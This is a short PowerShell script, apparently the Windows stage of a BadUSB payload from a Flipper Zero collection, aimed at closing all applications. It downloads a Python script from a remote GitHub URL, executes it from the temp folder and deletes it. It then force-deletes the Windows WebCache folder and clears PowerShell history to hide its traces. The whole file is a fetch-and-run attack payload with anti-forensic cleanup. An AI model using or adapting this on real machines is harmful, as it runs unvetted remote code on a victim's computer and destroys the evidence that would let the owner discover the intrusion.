# Download Python script
$scriptUrl = "https://raw.githubusercontent.com/aleff-github/my-flipper-shits/main/%5BBADUSB%5D%20Close%20All%20Applications%20-%20Windows/script.py"
$savePath = "$env:temp\script.py"
(New-Object System.Net.WebClient).DownloadFile($scriptUrl, $savePath)

# Execute Python script
& python $savePath

# Delete the downloaded script
Remove-Item $savePath

# Clear the download history from the system's web cache
Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\*" -Recurse -Force

# Clear the PowerShell command history
Clear-History